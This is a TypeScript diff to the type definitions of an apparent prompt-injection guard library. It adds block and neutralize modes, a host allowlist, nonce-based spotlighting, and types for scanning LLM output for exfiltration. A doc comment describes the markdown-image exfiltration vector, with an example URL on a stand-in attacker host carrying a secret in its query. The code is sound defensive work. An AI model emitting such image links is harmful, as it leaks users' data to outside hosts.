@@ -24,6 +24,21 @@ export interface SanitizationResult {
 }
 
 /**
+ * Enforcement mode for a field.
+ *
+ * - `"block"` — Inputs with **high-severity** injection patterns are rejected
+ *   entirely. Medium-severity patterns are still neutralized (not blocked)
+ *   regardless of this setting.
+ * - `"neutralize"` — All detected injection keywords are mangled (hyphenated)
+ *   so the LLM reads them as nonsense tokens; nothing is ever blocked.
+ *
+ * Pick `"block"` for form fields where you can reject input (product names,
+ * usernames, search queries). Pick `"neutralize"` for free-form user text
+ * where blocking would harm UX (reviews, comments, chat).
+ */
+export type GuardMode = "block" | "neutralize";
+
+/**
  * Configuration for how a specific field should be sanitized.
  */
 export interface FieldConfig {
@@ -33,14 +48,12 @@ export interface FieldConfig {
    */
   maxLength: number;
   /**
-   * When true, inputs with **high-severity** injection patterns are rejected
-   * entirely. Medium-severity patterns are still neutralized (not blocked)
-   * regardless of this setting.
+   * Enforcement mode — see {@link GuardMode}.
    *
-   * When false, all detected injection keywords are neutralized (hyphenated)
-   * instead of blocking.
+   * `"block"` rejects high-severity inputs; `"neutralize"` mangles
+   * every detected keyword and never blocks.
    */
-  blockOnDetection: boolean;
+  mode: GuardMode;
   /** Label for this field in log messages (e.g., "username", "comment") */
   fieldName: string;
 }
@@ -49,7 +62,7 @@ export interface FieldConfig {
  * Severity level of a detected injection pattern.
  *
  * - `"high"` — Clear injection attempt (instruction override, role hijacking, format injection).
- *   Triggers blocking when `blockOnDetection` is true.
+ *   Triggers blocking when `mode: "block"`.
  * - `"medium"` — Suspicious but potentially legitimate (code blocks, certain keywords in context).
  *   Always neutralized, never triggers blocking on its own.
  */
@@ -89,18 +102,97 @@ export interface GuardConfig {
   /** Built-in pattern categories to disable (e.g., ["confidence-manipulation"]). */
   disableCategories?: string[];
   /**
-   * When `true`, `sanitize()` returns the Unicode-normalized form on the
-   * clean path (no injection detected) too — stripping invisible characters
-   * and mapping homoglyphs to Latin equivalents before returning.
+   * When `true` (**default in v2.0**), `sanitize()` returns the Unicode-normalized
+   * form on the clean path (no injection detected) too — stripping invisible
+   * characters and mapping homoglyphs to Latin equivalents before returning.
+   * This is the safer default: it blocks the class of attacks where an
+   * attacker smuggles invisible characters through your app into a
+   * downstream system (logs, webhooks, other LLMs) that re-processes them.
    *
-   * When `false` (default in v2.0), clean input passes through unchanged
-   * so visible output matches what the user typed. This keeps behavior
-   * compatible with v1 while exposing the option for callers who prefer
-   * defense-in-depth over fidelity.
+   * When `false`, clean input passes through unchanged so visible output
+   * matches exactly what the user typed. Use this opt-out when byte-for-byte
+   * fidelity matters more than defense-in-depth (e.g., code search,
+   * raw-text editors).
    *
    * Detection/neutralization paths always run on the normalized form
    * regardless of this setting — flipping it only affects what the
    * caller sees when no injection was found.
    */
   normalizeOutput?: boolean;
+  /**
+   * Host allowlist for `scanOutput()`. Outbound URLs whose host matches any
+   * entry in this list are NOT flagged as `outbound-url`. Host matching is
+   * case-insensitive and supports subdomain-suffix matches (e.g., listing
+   * `"example.com"` also allows `"api.example.com"`).
+   *
+   * Other finding types (`markdown-image-with-query`, `data-url`,
+   * `base64-blob`, `hex-blob`) are not affected by this setting.
+   */
+  allowedOrigins?: string[];
+}
+
+/**
+ * Result of wrapping an input with spotlight delimiters.
+ *
+ * Spotlighting (a.k.a. datamarking, delimiter-wrapping) is a defense-in-depth
+ * technique originally described by Microsoft and refined by Berkeley's
+ * StruQ/SecAlign work. Rather than trusting the LLM to keep user input
+ * separate from system instructions, the wrapper bounds it with a random
+ * nonce that the attacker cannot predict. Callers can verify the LLM
+ * didn't break out by searching for the opening/closing tags with the
+ * specific nonce in the response.
+ *
+ * @see Microsoft Spotlighting: https://arxiv.org/abs/2311.11538
+ * @see Berkeley StruQ-SecAlign: https://arxiv.org/abs/2402.06363
+ */
+export interface SpotlightResult {
+  /** The wrapped input: `<USER_INPUT_{nonce}>…</USER_INPUT_{nonce}>`. */
+  wrapped: string;
+  /** The random nonce used (12-char lowercase hex). */
+  delimiter: string;
+  /** The original input, sanitized first (uses the guard's configured mode, defaulting to "neutralize"). */
+  sanitized: string;
+}
+
+/**
+ * A specific shape found in LLM output that commonly indicates data
+ * exfiltration.
+ *
+ * - `"base64-blob"` — a long run of base64 characters (likely encoded data).
+ * - `"markdown-image-with-query"` — a markdown image embed whose URL carries
+ *   a query string (classic one-shot exfil vector: the LLM renders an
+ *   `![alt](https://attacker/pixel.png?data=secret)` line and the client
+ *   fetches the URL, leaking `secret` via the query).
+ * - `"outbound-url"` — any `http://` or `https://` URL in the output. Use
+ *   `GuardConfig.allowedOrigins` to suppress known-good hosts.
+ * - `"data-url"` — a `data:…;base64,…` URL (common smuggling channel).
+ * - `"hex-blob"` — a long run of hex digits (hex-encoded data).
+ */
+export type ExfilFindingType =
+  | "base64-blob"
+  | "markdown-image-with-query"
+  | "outbound-url"
+  | "data-url"
+  | "hex-blob";
+
+/**
+ * A single exfiltration-shape finding inside LLM output.
+ */
+export interface ExfilFinding {
+  /** The category of shape matched. */
+  type: ExfilFindingType;
+  /** First 60 chars of the match — for logging; do not expose to end users. */
+  preview: string;
+  /** Index in the input where the match starts. */
+  offset: number;
+}
+
+/**
+ * Result of scanning LLM output for exfiltration shapes.
+ */
+export interface OutputScanResult {
+  /** `true` when no suspicious shapes were found. */
+  safe: boolean;
+  /** Every matched shape, in order of appearance. */
+  findings: ExfilFinding[];
 }
